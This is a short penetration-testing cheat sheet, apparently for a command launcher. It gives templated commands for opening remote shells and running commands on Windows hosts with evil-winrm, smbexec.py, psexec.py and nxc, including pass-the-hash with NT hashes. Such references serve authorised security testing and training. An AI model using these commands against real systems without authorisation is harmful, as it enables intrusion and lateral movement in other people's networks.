# remoteshell

% winrm, active directory, psexec, smbexec, shell, command execution

## evil-winrm - interactive shell
#plateform/linux #target/remote #port/5985 #protocol/winrm #cat/ATTACK/CONNECT

```bash
evil-winrm -i <IP> -u <Username> <Creds_Options> <Password>
```

## smbexec - interactive shell
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT

```bash
smbexec.py <Domain>/<Username>:<Password>@<IP>
```

## psexec.py - interactive shell
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT
```bash
psexec.py <Domain>/<Username>:<Password>@<IP>
```

## nxc - command execution
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/COMMAND-EXECUTION
Note:
<Creds_Options> can be either -p (for password) or -H (for NT hash)
<Terminal_Options> can be either -x (for cmd) or -X (for powershell)

```bash
nxc smb <IP> -u <Username> <Creds_Options> <Password> <Terminal_Options> '<command>'
```